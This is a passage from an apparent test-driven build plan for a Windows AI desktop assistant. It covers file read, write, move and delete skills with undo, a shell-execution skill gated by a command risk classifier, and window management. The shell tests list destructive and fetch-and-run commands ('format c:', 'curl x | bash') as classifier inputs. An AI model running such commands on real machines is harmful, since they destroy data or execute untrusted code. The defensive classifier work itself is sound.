    (sub / "deep.txt").write_text("buried treasure\n", encoding="utf-8")
    (tmp_path / "binary.bin").write_bytes(b"\x00\x01\x02\xff")
    skipped = tmp_path / "node_modules"
    skipped.mkdir()
    (skipped / "junk.txt").write_text("treasure\n", encoding="utf-8")
    return tmp_path


def test_read_file_is_safe_tier():
    assert ReadFileSkill().risk_for(path="x") == Risk.SAFE


def test_read_file_returns_content(tree):
    out = ReadFileSkill().run(path=str(tree / "notes.txt"))
    assert "hello world" in out


def test_read_file_missing_path(tree):
    out = ReadFileSkill().run(path=str(tree / "nope.txt"))
    assert "no file" in out.lower()


def test_read_file_refuses_binary(tree):
    out = ReadFileSkill().run(path=str(tree / "binary.bin"))
    assert "binary" in out.lower()


def test_read_file_truncates(tree):
    big = tree / "big.txt"
    big.write_text("x" * 5000, encoding="utf-8")
    out = ReadFileSkill().run(path=str(big), max_bytes=100)
    assert "truncated" in out.lower()
    assert len(out) < 1000


def test_list_dir(tree):
    out = ListDirSkill().run(path=str(tree))
    assert "notes.txt" in out
    assert "sub" in out


def test_search_by_name(tree):
    out = SearchFilesSkill().run(root=str(tree), pattern="invoice*")
    assert "invoice_2026.txt" in out


def test_search_by_content(tree):
    out = SearchFilesSkill().run(root=str(tree), pattern="*.txt", contains="treasure")
    assert "deep.txt" in out


def test_search_skips_noise_directories(tree):
    out = SearchFilesSkill().run(root=str(tree), pattern="*.txt", contains="treasure")
    assert "node_modules" not in out


def test_search_reports_no_matches(tree):
    out = SearchFilesSkill().run(root=str(tree), pattern="*.nothing")
    assert "no files" in out.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_file_skills.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'skills.file_skills'`

- [ ] **Step 3: Write the implementation**

Create `skills/file_skills.py`:

```python
"""Filesystem access.

Reading is SAFE — it changes nothing and Jarvis is far more useful when it can
look things up without asking. Everything that mutates lives in the second half
of this file and carries an undo entry.
"""
import fnmatch
import os
from pathlib import Path

from core.risk import Risk

from .base_skill import BaseSkill

# Directories that are almost never what the user meant and would swamp results.
SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__", ".pytest_cache",
             "$RECYCLE.BIN", "System Volume Information", ".superpowers"}

READ_LIMIT = 200_000
SEARCH_RESULT_LIMIT = 100
CONTENT_SCAN_LIMIT = 2_000_000  # bytes per file when grepping


def _looks_binary(data: bytes) -> bool:
    return b"\x00" in data[:8192]


class ReadFileSkill(BaseSkill):
    name = "read_file"
    description = (
        "Read a text file from the user's PC and return its contents. Use for "
        "'what's in this file', 'summarise this document', 'check my config'."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Absolute path to the file."},
            "max_bytes": {
                "type": "integer",
                "description": f"Truncate after this many bytes (default {READ_LIMIT}).",
            },
        },
        "required": ["path"],
    }
    risk = Risk.SAFE

    def run(self, path: str, max_bytes: int = READ_LIMIT) -> str:
        target = Path(path).expanduser()
        if not target.exists():
            return f"There is no file at {path}."
        if target.is_dir():
            return f"{path} is a directory. Use list_dir instead."

        try:
            data = target.read_bytes()
        except PermissionError:
            return f"I don't have permission to read {path}."
        except OSError as e:
            return f"I couldn't read {path}: {e}"

        if _looks_binary(data):
            return f"{path} looks like a binary file ({len(data)} bytes), so there's nothing to read out."

        limit = max(1, int(max_bytes))
        text = data[:limit].decode("utf-8", errors="replace")
        if len(data) > limit:
            text += f"\n\n[truncated — showing {limit} of {len(data)} bytes]"
        return text


class ListDirSkill(BaseSkill):
    name = "list_dir"
    description = "List the files and folders in a directory on the user's PC."
    input_schema = {
        "type": "object",
        "properties": {"path": {"type": "string", "description": "Absolute directory path."}},
        "required": ["path"],
    }
    risk = Risk.SAFE

    def run(self, path: str) -> str:
        target = Path(path).expanduser()
        if not target.exists():
            return f"There is no directory at {path}."
        if not target.is_dir():
            return f"{path} is a file, not a directory."

        try:
            entries = sorted(target.iterdir(), key=lambda p: (p.is_file(), p.name.lower()))
        except PermissionError:
            return f"I don't have permission to list {path}."

        if not entries:
            return f"{path} is empty."

        lines = []
        for entry in entries[:200]:
            if entry.is_dir():
                lines.append(f"  {entry.name}/")
            else:
                try:
                    size = entry.stat().st_size
                except OSError:
                    size = 0
                lines.append(f"  {entry.name}  ({size:,} bytes)")
        out = f"{path}:\n" + "\n".join(lines)
        if len(entries) > 200:
            out += f"\n  ... and {len(entries) - 200} more"
        return out


class SearchFilesSkill(BaseSkill):
    name = "search_files"
    description = (
        "Find files on the user's PC by name pattern, optionally filtering to "
        "files containing some text. Use this rather than shelling out to "
        "'dir /s' or 'find'. Example: pattern '*.pdf', contains 'invoice'."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "root": {"type": "string", "description": "Directory to search under."},
            "pattern": {
                "type": "string",
                "description": "Filename glob, e.g. '*.pdf' or 'report*'. Use '*' for any file.",
            },
            "contains": {
                "type": "string",
                "description": "Optional text that must appear inside the file.",
            },
            "max_results": {"type": "integer", "description": "Default 100."},
        },
        "required": ["root", "pattern"],
    }
    risk = Risk.SAFE

    def run(self, root: str, pattern: str, contains: str = "",
            max_results: int = SEARCH_RESULT_LIMIT) -> str:
        start = Path(root).expanduser()
        if not start.is_dir():
            return f"There is no directory at {root}."

        limit = max(1, int(max_results))
        needle = contains.lower() if contains else ""
        hits: list[str] = []

        for dirpath, dirnames, filenames in os.walk(start):
            dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS and not d.startswith(".")]
            for filename in filenames:
                if not fnmatch.fnmatch(filename.lower(), pattern.lower()):
                    continue
                full = Path(dirpath) / filename
                if needle and not self._contains(full, needle):
                    continue
                hits.append(str(full))
                if len(hits) >= limit:
                    break
            if len(hits) >= limit:
                break

        if not hits:
            where = f" containing '{contains}'" if contains else ""
            return f"No files matching '{pattern}'{where} under {root}."
        return f"Found {len(hits)} file(s):\n" + "\n".join(f"  {h}" for h in hits)

    @staticmethod
    def _contains(path: Path, needle: str) -> bool:
        try:
            if path.stat().st_size > CONTENT_SCAN_LIMIT:
                return False
            data = path.read_bytes()
        except OSError:
            return False
        if _looks_binary(data):
            return False
        return needle in data.decode("utf-8", errors="ignore").lower()
```

- [ ] **Step 4: Register the skills**

In `skills/skill_manager.py`, add the import and three entries to `SKILL_CLASSES` after `ScreenshotSkill`:

```python
from .file_skills import ListDirSkill, ReadFileSkill, SearchFilesSkill
```
```python
    ReadFileSkill,
    ListDirSkill,
    SearchFilesSkill,
```

- [ ] **Step 5: Run test to verify it passes**

Run: `python -m pytest tests/test_file_skills.py tests/test_skills.py -q`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add skills/file_skills.py skills/skill_manager.py tests/test_file_skills.py
git commit -m "feat: add read-only file skills (read, list, search)"
```

---

## Task 6: Mutating file skills with undo

**Files:**
- Modify: `skills/file_skills.py`, `skills/skill_manager.py`
- Test: `tests/test_file_skills.py`

**Interfaces:**
- Consumes: `move_to_trash`, `get_journal` from Task 2; `is_sensitive_path` from Task 1
- Produces: `WriteFileSkill` (`write_file`), `MakeDirSkill` (`make_dir`), `MoveFileSkill` (`move_file`), `DeleteFileSkill` (`delete_file`)

- [ ] **Step 1: Write the failing test**

Append to `tests/test_file_skills.py`:

```python
from core.undo import UndoJournal, get_journal, set_journal
from skills.file_skills import DeleteFileSkill, MakeDirSkill, MoveFileSkill, WriteFileSkill


@pytest.fixture
def journal(tmp_path, monkeypatch):
    import config
    monkeypatch.setattr(config, "DATA_DIR", str(tmp_path / "jarvisdata"))
    j = UndoJournal(max_age_seconds=900)
    set_journal(j)
    yield j
    set_journal(None)


def test_write_new_file_is_moderate(journal, tmp_path):
    target = tmp_path / "new.txt"
    assert WriteFileSkill().risk_for(path=str(target), content="x") == Risk.MODERATE


def test_overwrite_is_dangerous(journal, tmp_path):
    target = tmp_path / "existing.txt"
    target.write_text("old", encoding="utf-8")
    assert WriteFileSkill().risk_for(path=str(target), content="new") == Risk.DANGEROUS


def test_write_under_sensitive_root_is_dangerous(journal, monkeypatch, tmp_path):
    monkeypatch.setattr("core.risk.SENSITIVE_ROOTS", [tmp_path])
    assert WriteFileSkill().risk_for(path=str(tmp_path / "x.txt"), content="y") == Risk.DANGEROUS


def test_write_then_undo_removes_a_new_file(journal, tmp_path):
    target = tmp_path / "new.txt"
    WriteFileSkill().run(path=str(target), content="hello")
    assert target.read_text(encoding="utf-8") == "hello"

    get_journal().undo(get_journal().latest().token)
    assert not target.exists()


def test_overwrite_then_undo_restores_original_bytes(journal, tmp_path):
    target = tmp_path / "doc.txt"
    target.write_text("ORIGINAL", encoding="utf-8")

    WriteFileSkill().run(path=str(target), content="REPLACED")
    assert target.read_text(encoding="utf-8") == "REPLACED"

    get_journal().undo(get_journal().latest().token)
    assert target.read_text(encoding="utf-8") == "ORIGINAL"


def test_delete_then_undo_restores(journal, tmp_path):
    target = tmp_path / "gone.txt"
    target.write_text("still here", encoding="utf-8")

    DeleteFileSkill().run(path=str(target))
    assert not target.exists()

    get_journal().undo(get_journal().latest().token)
    assert target.read_text(encoding="utf-8") == "still here"


def test_delete_is_dangerous(journal, tmp_path):
    assert DeleteFileSkill().risk_for(path=str(tmp_path / "x")) == Risk.DANGEROUS


def test_move_then_undo_returns_the_file(journal, tmp_path):
    src = tmp_path / "a.txt"
    dst = tmp_path / "b.txt"
    src.write_text("data", encoding="utf-8")

    MoveFileSkill().run(src=str(src), dst=str(dst))
    assert dst.exists() and not src.exists()

    get_journal().undo(get_journal().latest().token)
    assert src.read_text(encoding="utf-8") == "data"
    assert not dst.exists()


def test_move_onto_existing_is_dangerous(journal, tmp_path):
    src = tmp_path / "a.txt"
    dst = tmp_path / "b.txt"
    src.write_text("a", encoding="utf-8")
    dst.write_text("b", encoding="utf-8")
    assert MoveFileSkill().risk_for(src=str(src), dst=str(dst)) == Risk.DANGEROUS


def test_make_dir_then_undo(journal, tmp_path):
    target = tmp_path / "fresh"
    MakeDirSkill().run(path=str(target))
    assert target.is_dir()

    get_journal().undo(get_journal().latest().token)
    assert not target.exists()


def test_delete_missing_file_records_no_undo(journal, tmp_path):
    out = DeleteFileSkill().run(path=str(tmp_path / "ghost.txt"))
    assert "no file" in out.lower()
    assert get_journal().latest() is None, "a no-op must not offer a fake undo"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_file_skills.py -q`
Expected: FAIL — `ImportError: cannot import name 'WriteFileSkill'`

- [ ] **Step 3: Write the implementation**

Append to `skills/file_skills.py` (and add `import shutil` plus `from core.risk import Risk, is_sensitive_path` and `from core.undo import get_journal, move_to_trash` to the imports):

```python
class WriteFileSkill(BaseSkill):
    name = "write_file"
    description = (
        "Write text to a file on the user's PC, creating it or replacing its "
        "contents. The previous version is kept so the write can be undone."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Absolute path to write."},
            "content": {"type": "string", "description": "The full new contents."},
        },
        "required": ["path", "content"],
    }
    risk = Risk.MODERATE

    def risk_for(self, path: str = "", **_) -> Risk:
        target = Path(path).expanduser()
        if is_sensitive_path(target.parent if not target.exists() else target):
            return Risk.DANGEROUS
        return Risk.DANGEROUS if target.exists() else Risk.MODERATE

    def consequence(self, path: str = "", **_) -> str:
        target = Path(path).expanduser()
        if is_sensitive_path(target):
            return f"{path} is a protected system location. Overwrite it anyway?"
        if target.exists():
            return f"Overwrite the existing file at {path}?"
        return f"Create {path}?"

    def run(self, path: str, content: str) -> str:
        target = Path(path).expanduser()
        existed = target.exists()

        backup = None
        if existed:
            try:
                backup = move_to_trash(target)
            except OSError as e:
                return f"I couldn't back up {path} before writing, so I stopped: {e}"

        try:
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")
        except PermissionError:
            return f"I don't have permission to write {path}."
        except OSError as e:
            return f"I couldn't write {path}: {e}"

        if existed:
            def restore(dest=target, source=backup):
                shutil.copy2(source, dest)
                return f"Restored the previous {dest.name}."

            get_journal().record(f"Restore the previous {target.name}", restore)
            return f"Updated {path} ({len(content)} characters). The previous version is recoverable."

        def remove(dest=target):
            dest.unlink(missing_ok=True)
            return f"Removed {dest.name}."

        get_journal().record(f"Delete the new {target.name}", remove)
        return f"Created {path} ({len(content)} characters)."


class MakeDirSkill(BaseSkill):
    name = "make_dir"
    description = "Create a folder on the user's PC."
    input_schema = {
        "type": "object",
        "properties": {"path": {"type": "string", "description": "Absolute folder path."}},
        "required": ["path"],
    }
    risk = Risk.MODERATE

    def risk_for(self, path: str = "", **_) -> Risk:
        return Risk.DANGEROUS if is_sensitive_path(Path(path).expanduser().parent) else Risk.MODERATE

    def consequence(self, path: str = "", **_) -> str:
        return f"Create the folder {path}?"

    def run(self, path: str) -> str:
        target = Path(path).expanduser()
        if target.exists():
            return f"{path} already exists."
        try:
            target.mkdir(parents=True)
        except OSError as e:
            return f"I couldn't create {path}: {e}"

        def remove(dest=target):
            try:
                dest.rmdir()
                return f"Removed {dest.name}."
            except OSError:
                return f"{dest.name} is no longer empty, so I left it alone."

        get_journal().record(f"Remove the folder {target.name}", remove)
        return f"Created the folder {path}."


class MoveFileSkill(BaseSkill):
    name = "move_file"
    description = (
        "Move or rename a file or folder on the user's PC. Use for tidying up, "
        "renaming, and reorganising."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "src": {"type": "string", "description": "Path to move."},
            "dst": {"type": "string", "description": "New path."},
        },
        "required": ["src", "dst"],
    }
    risk = Risk.MODERATE

    def risk_for(self, src: str = "", dst: str = "", **_) -> Risk:
        destination = Path(dst).expanduser()
        if destination.exists() or is_sensitive_path(Path(src).expanduser()):
            return Risk.DANGEROUS
        return Risk.MODERATE

    def consequence(self, src: str = "", dst: str = "", **_) -> str:
        if Path(dst).expanduser().exists():
            return f"Move {src} onto {dst}, replacing what's there?"
        return f"Move {src} to {dst}?"

    def run(self, src: str, dst: str) -> str:
        source = Path(src).expanduser()
        destination = Path(dst).expanduser()

        if not source.exists():
            return f"There is no file at {src}."

        replaced = None
        if destination.exists():
            try:
                replaced = move_to_trash(destination)
            except OSError as e:
                return f"I couldn't back up {dst} before replacing it, so I stopped: {e}"

        try:
            destination.parent.mkdir(parents=True, exist_ok=True)
            shutil.move(str(source), str(destination))
        except OSError as e:
            return f"I couldn't move {src}: {e}"

        def undo(a=source, b=destination, old=replaced):
            shutil.move(str(b), str(a))
            if old is not None:
                shutil.copy2(old, b)
            return f"Moved {a.name} back."

        get_journal().record(f"Move {destination.name} back to {source}", undo)
        return f"Moved {src} to {dst}."


class DeleteFileSkill(BaseSkill):
    name = "delete_file"
    description = (
        "Delete a file or folder on the user's PC. It is copied to Jarvis's "
        "trash first, so the deletion can be undone."
    )
    input_schema = {
        "type": "object",
        "properties": {"path": {"type": "string", "description": "Absolute path to delete."}},
        "required": ["path"],
    }
    risk = Risk.DANGEROUS

    def consequence(self, path: str = "", **_) -> str:
        target = Path(path).expanduser()
        if is_sensitive_path(target):
            return f"{path} is a protected system location. Delete it anyway?"
        if target.is_dir():
            return f"Delete the folder {path} and everything inside it?"
        return f"Delete {path}?"

    def run(self, path: str) -> str:
        target = Path(path).expanduser()
        if not target.exists():
            return f"There is no file or folder at {path}."

        try:
            backup = move_to_trash(target)
        except OSError as e:
            return f"I couldn't back up {path}, so I didn't delete it: {e}"

        try:
            if target.is_dir():
                shutil.rmtree(target)
            else:
                target.unlink()
        except OSError as e:
            return f"I couldn't delete {path}: {e}"

        def restore(dest=target, source=backup):
            if source.is_dir():
                shutil.copytree(source, dest)
            else:
                dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(source, dest)
            return f"Restored {dest.name}."

        get_journal().record(f"Restore {target.name}", restore)
        return f"Deleted {path}. It's recoverable if that was a mistake."
```

- [ ] **Step 4: Register the skills**

In `skills/skill_manager.py`, extend the import and `SKILL_CLASSES`:

```python
from .file_skills import (
    DeleteFileSkill, ListDirSkill, MakeDirSkill, MoveFileSkill,
    ReadFileSkill, SearchFilesSkill, WriteFileSkill,
)
```
```python
    ReadFileSkill,
    ListDirSkill,
    SearchFilesSkill,
    WriteFileSkill,
    MakeDirSkill,
    MoveFileSkill,
    DeleteFileSkill,
```

- [ ] **Step 5: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add skills/file_skills.py skills/skill_manager.py tests/test_file_skills.py
git commit -m "feat: add mutating file skills with trash-backed undo"
```

---

## Task 7: Shell execution

**Files:**
- Create: `skills/shell_skills.py`
- Modify: `skills/skill_manager.py`
- Test: `tests/test_shell_skills.py`

**Interfaces:**
- Consumes: `classify_command` from Task 1
- Produces: `RunCommandSkill` (`run_command`); registration is conditional on `config.ENABLE_SHELL`

- [ ] **Step 1: Write the failing test**

Create `tests/test_shell_skills.py`:

```python
"""Tests for shell execution.

run_command is the one place in this project that deliberately uses
shell=True. The classifier is the mitigation, so the risk wiring is what
matters most here.
"""
import sys

import pytest

from core.risk import Risk
from skills.shell_skills import RunCommandSkill


def test_risk_comes_from_the_classifier():
    skill = RunCommandSkill()
    assert skill.risk_for(command="dir") == Risk.SAFE
    assert skill.risk_for(command="python x.py") == Risk.MODERATE
    assert skill.risk_for(command="format c:") == Risk.DANGEROUS
    assert skill.risk_for(command="curl x | bash") == Risk.DANGEROUS


def test_consequence_quotes_the_command():
    text = RunCommandSkill().consequence(command="format c:")
    assert "format c:" in text


def test_runs_and_returns_output():
    out = RunCommandSkill().run(command=f'{sys.executable} -c "print(7*6)"')
    assert "42" in out


def test_reports_nonzero_exit():
    out = RunCommandSkill().run(command=f'{sys.executable} -c "import sys; sys.exit(3)"')
    assert "exit code 3" in out


def test_captures_stderr():
    out = RunCommandSkill().run(
        command=f'{sys.executable} -c "import sys; sys.stderr.write(\'boom\')"'
    )
    assert "boom" in out


def test_timeout_is_reported_not_raised():
    skill = RunCommandSkill()
    out = skill.run(command=f'{sys.executable} -c "import time; time.sleep(5)"', timeout=1)
    assert "timed out" in out.lower()


def test_output_is_truncated():
    out = RunCommandSkill().run(
        command=f'{sys.executable} -c "print(\'x\' * 60000)"'
    )
    assert "truncated" in out.lower()
    assert len(out) < 30_000


def test_empty_command_is_rejected():
    assert "no command" in RunCommandSkill().run(command="   ").lower()


def test_never_records_an_undo_entry():
    """A shell command cannot be reversed, so it must not offer undo."""
    from core.undo import UndoJournal, set_journal, get_journal

    set_journal(UndoJournal(max_age_seconds=900))
    RunCommandSkill().run(command=f'{sys.executable} -c "pass"')
    latest = get_journal().latest()
    set_journal(None)
    assert latest is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_shell_skills.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'skills.shell_skills'`

- [ ] **Step 3: Write the implementation**

Create `skills/shell_skills.py`:

```python
"""Arbitrary shell execution.

This is the one skill in the project that intentionally uses shell=True: its
whole purpose is to accept a shell command string, so an argv list does not
apply. core.risk.classify_command is the mitigation, and it is pattern-based
and therefore incomplete — see the spec's "Risks accepted" section.

A shell command can never be undone, so this skill never records an undo entry.
"""
import subprocess

from core.risk import Risk, classify_command

from .base_skill import BaseSkill

OUTPUT_LIMIT = 20_000


class RunCommandSkill(BaseSkill):
    name = "run_command"
    description = (
        "Run a shell command on the user's Windows PC and return its output. "
        "Use this for things no other skill covers. Prefer search_files over "
        "'dir /s', and read_file over 'type'. Cannot be undone."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "command": {"type": "string", "description": "The command line to run."},
            "cwd": {"type": "string", "description": "Optional working directory."},
            "timeout": {
                "type": "integer",
                "description": "Seconds before the command is killed (default 60).",
            },
        },
        "required": ["command"],
    }

    def risk_for(self, command: str = "", **_) -> Risk:
        return classify_command(command)

    def consequence(self, command: str = "", **_) -> str:
        return f"Run this command?\n    {command}"

    def run(self, command: str, cwd: str = "", timeout: int = 60) -> str:
        if not command or not command.strip():
            return "There was no command to run."

        try:
            completed = subprocess.run(
                command,
                shell=True,  # deliberate: this skill's contract is a shell string
                cwd=cwd or None,
                capture_output=True,
                text=True,
                errors="replace",
                timeout=max(1, int(timeout)),
            )
        except subprocess.TimeoutExpired as e:
            partial = (e.stdout or "") + (e.stderr or "")
            tail = f"\nPartial output:\n{partial[:2000]}" if partial.strip() else ""
            return f"The command timed out after {timeout} seconds and was killed.{tail}"
        except FileNotFoundError:
            return f"I couldn't find anything to run for: {command}"
        except OSError as e:
            return f"I couldn't run that command: {e}"

        parts = []
        if completed.stdout.strip():
            parts.append(completed.stdout.rstrip())
        if completed.stderr.strip():
            parts.append(f"[stderr]\n{completed.stderr.rstrip()}")

        output = "\n".join(parts) if parts else "(no output)"
        if len(output) > OUTPUT_LIMIT:
            output = output[:OUTPUT_LIMIT] + f"\n[truncated at {OUTPUT_LIMIT} characters]"

        if completed.returncode != 0:
            return f"Command finished with exit code {completed.returncode}.\n{output}"
        return output
```

- [ ] **Step 4: Register conditionally**

In `skills/skill_manager.py`, after the `SKILL_CLASSES` list, add:

```python
if config.ENABLE_SHELL:
    from .shell_skills import RunCommandSkill

    SKILL_CLASSES.append(RunCommandSkill)
```

and add `import config` to the top of the file.

- [ ] **Step 5: Add the kill-switch test**

Append to `tests/test_shell_skills.py`:

```python
def test_kill_switch_removes_the_tool(monkeypatch):
    """A disabled capability must not appear in the tool list at all, so the
    model never sees a tool it will always be refused."""
    import importlib

    import config
    import skills.skill_manager as sm

    monkeypatch.setattr(config, "ENABLE_SHELL", False)
    importlib.reload(sm)
    try:
        names = {t["name"] for t in sm.SkillManager().tool_definitions()}
        assert "run_command" not in names
    finally:
        monkeypatch.setattr(config, "ENABLE_SHELL", True)
        importlib.reload(sm)
```

- [ ] **Step 6: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add skills/shell_skills.py skills/skill_manager.py tests/test_shell_skills.py
git commit -m "feat: add risk-classified shell execution"
```

---

## Task 8: Window management

**Files:**
- Create: `skills/window_skills.py`
- Modify: `skills/skill_manager.py`
- Test: `tests/test_window_input_skills.py`

**Interfaces:**
- Consumes: `BaseSkill`, `Risk`, `get_journal`
- Produces: `ListWindowsSkill` (`list_windows`), `FocusWindowSkill` (`focus_window`), `SetWindowStateSkill` (`set_window_state`), `CloseWindowSkill` (`close_window`); helper `enumerate_windows() -> list[tuple[int, str]]`

- [ ] **Step 1: Write the failing test**

Create `tests/test_window_input_skills.py`:

```python
"""Tests for window management and synthetic input.

Both are Windows-only, so the OS calls are patched and the suite still runs
on Linux/WSL — matching how system_skills is already tested.
"""
import pytest

from core.risk import Risk
from core.undo import UndoJournal, get_journal, set_journal
from skills.window_skills import (
    CloseWindowSkill, FocusWindowSkill, ListWindowsSkill, SetWindowStateSkill,
)


@pytest.fixture
def journal():
    j = UndoJournal(max_age_seconds=900)
    set_journal(j)
    yield j
    set_journal(None)


@pytest.fixture
def windows(monkeypatch):
    listing = [(101, "Chrome — Gmail"), (102, "Visual Studio Code"), (103, "Spotify")]
    monkeypatch.setattr("skills.window_skills.enumerate_windows", lambda: listing)
    monkeypatch.setattr("skills.window_skills.IS_WINDOWS", True)
    return listing


def test_list_windows_is_safe(windows):
    assert ListWindowsSkill().risk_for() == Risk.SAFE
    out = ListWindowsSkill().run()
    assert "Spotify" in out and "Visual Studio Code" in out


def test_focus_is_moderate_close_is_dangerous(windows):
    assert FocusWindowSkill().risk_for(title="spotify") == Risk.MODERATE
    assert CloseWindowSkill().risk_for(title="spotify") == Risk.DANGEROUS


def test_ambiguous_title_asks_rather_than_guessing(windows, monkeypatch, journal):
    """Two matches must not be resolved by picking the first one."""
    monkeypatch.setattr(
        "skills.window_skills.enumerate_windows",
        lambda: [(1, "Chrome — Gmail"), (2, "Chrome — Docs")],
    )
    out = FocusWindowSkill().run(title="chrome")
    assert "more than one" in out.lower()
    assert "Gmail" in out and "Docs" in out


def test_no_match_is_reported(windows):
    assert "couldn't find" in FocusWindowSkill().run(title="photoshop").lower()


def test_focus_records_an_undo_that_refocuses_the_previous_window(windows, monkeypatch, journal):
    focused = []
    monkeypatch.setattr("skills.window_skills.foreground_handle", lambda: 101)
    monkeypatch.setattr("skills.window_skills.focus_handle", lambda h: focused.append(h))

    FocusWindowSkill().run(title="spotify")
    assert focused == [103]

    get_journal().undo(get_journal().latest().token)
    assert focused == [103, 101], "undo should restore the previously focused window"


def test_close_window_records_no_undo(windows, monkeypatch, journal):
    """Closing may discard unsaved work and cannot be reversed."""
    monkeypatch.setattr("skills.window_skills.close_handle", lambda h: None)
    CloseWindowSkill().run(title="spotify")
    assert get_journal().latest() is None


def test_set_window_state_records_undo(windows, monkeypatch, journal):
    states = []
    monkeypatch.setattr("skills.window_skills.window_state", lambda h: "normal")
    monkeypatch.setattr("skills.window_skills.set_state", lambda h, s: states.append((h, s)))

    SetWindowStateSkill().run(title="spotify", state="minimized")
    assert states == [(103, "minimized")]

    get_journal().undo(get_journal().latest().token)
    assert states[-1] == (103, "normal")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_window_input_skills.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'skills.window_skills'`

- [ ] **Step 3: Write the implementation**

Create `skills/window_skills.py`:

```python
"""Window management via ctypes against user32.

ctypes rather than pywin32: this needs six calls, and pywin32 was removed from
requirements as unused. Every OS entry point is a module-level function so the
tests can patch it and run on Linux.
"""
import ctypes
import sys
from ctypes import wintypes

from core.risk import Risk
from core.undo import get_journal

from .base_skill import BaseSkill

IS_WINDOWS = sys.platform == "win32"

SW_MINIMIZE = 6
SW_MAXIMIZE = 3
SW_RESTORE = 9
WM_CLOSE = 0x0010

STATE_TO_FLAG = {"minimized": SW_MINIMIZE, "maximized": SW_MAXIMIZE, "normal": SW_RESTORE}


def enumerate_windows() -> list[tuple[int, str]]:
    """Return [(hwnd, title)] for visible, titled top-level windows."""
    if not IS_WINDOWS:
        return []

    user32 = ctypes.windll.user32
    found: list[tuple[int, str]] = []

    callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

    def on_window(hwnd, _lparam):
        if not user32.IsWindowVisible(hwnd):
            return True
        length = user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return True
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buffer, length + 1)
        title = buffer.value.strip()
        if title:
            found.append((int(hwnd), title))
        return True

    user32.EnumWindows(callback_type(on_window), 0)
    return found


def foreground_handle() -> int:
    return int(ctypes.windll.user32.GetForegroundWindow()) if IS_WINDOWS else 0


def focus_handle(hwnd: int) -> None:
    user32 = ctypes.windll.user32
    user32.ShowWindow(hwnd, SW_RESTORE)
    user32.SetForegroundWindow(hwnd)


def window_state(hwnd: int) -> str:
    user32 = ctypes.windll.user32
    if user32.IsIconic(hwnd):
        return "minimized"
    if user32.IsZoomed(hwnd):
        return "maximized"
    return "normal"


def set_state(hwnd: int, state: str) -> None:
    ctypes.windll.user32.ShowWindow(hwnd, STATE_TO_FLAG[state])


def close_handle(hwnd: int) -> None:
    ctypes.windll.user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)


def _match(title: str) -> tuple[list[tuple[int, str]], str | None]:
    """Return (matches, error_message)."""
    needle = (title or "").strip().lower()
    if not needle:
        return [], "I need a window title to match."

    matches = [(h, t) for h, t in enumerate_windows() if needle in t.lower()]
    if not matches:
        return [], f"I couldn't find a window matching '{title}'."
    if len(matches) > 1:
        listing = "\n".join(f"  {t}" for _, t in matches)
        return matches, (
            f"'{title}' matches more than one window — tell me which:\n{listing}"
        )
    return matches, None


class ListWindowsSkill(BaseSkill):
    name = "list_windows"
    description = "List the windows currently open on the user's PC."
    input_schema = {"type": "object", "properties": {}, "required": []}
    risk = Risk.SAFE

    def run(self) -> str:
        if not IS_WINDOWS:
            return "Window management is only available on Windows."
        windows = enumerate_windows()
        if not windows:
            return "I can't see any open windows."
        return f"{len(windows)} open window(s):\n" + "\n".join(f"  {t}" for _, t in windows)


class FocusWindowSkill(BaseSkill):
    name = "focus_window"
    description = "Bring a window to the front by (part of) its title."
    input_schema = {
        "type": "object",
        "properties": {"title": {"type": "string", "description": "Part of the window title."}},
        "required": ["title"],
    }
    risk = Risk.MODERATE

    def consequence(self, title: str = "", **_) -> str:
        return f"Switch to the '{title}' window?"

    def run(self, title: str) -> str:
        if not IS_WINDOWS:
            return "Window management is only available on Windows."
        matches, problem = _match(title)
        if problem:
            return problem

        hwnd, matched_title = matches[0]
        previous = foreground_handle()
        focus_handle(hwnd)

        if previous and previous != hwnd:
            def restore(target=previous):
                focus_handle(target)
                return "Switched back."

            get_journal().record("Switch back to the previous window", restore)
        return f"Switched to {matched_title}."


class SetWindowStateSkill(BaseSkill):
    name = "set_window_state"
    description = "Minimise, maximise, or restore a window by (part of) its title."
    input_schema = {
        "type": "object",
        "properties": {
            "title": {"type": "string", "description": "Part of the window title."},
            "state": {"type": "string", "enum": ["minimized", "maximized", "normal"]},
        },
        "required": ["title", "state"],
    }
    risk = Risk.MODERATE

    def consequence(self, title: str = "", state: str = "", **_) -> str:
        return f"Set the '{title}' window to {state}?"

    def run(self, title: str, state: str) -> str:
        if not IS_WINDOWS:
            return "Window management is only available on Windows."
        if state not in STATE_TO_FLAG:
            return f"'{state}' isn't a window state I know."

        matches, problem = _match(title)
        if problem:
            return problem

        hwnd, matched_title = matches[0]
        previous = window_state(hwnd)
        set_state(hwnd, state)

        def restore(target=hwnd, old=previous):
            set_state(target, old)
            return f"Set it back to {old}."

        get_journal().record(f"Set {matched_title} back to {previous}", restore)
        return f"Set {matched_title} to {state}."


class CloseWindowSkill(BaseSkill):
    name = "close_window"
    description = (
        "Close a window by (part of) its title. This may discard unsaved work "
        "and cannot be undone."
    )
    input_schema = {
        "type": "object",
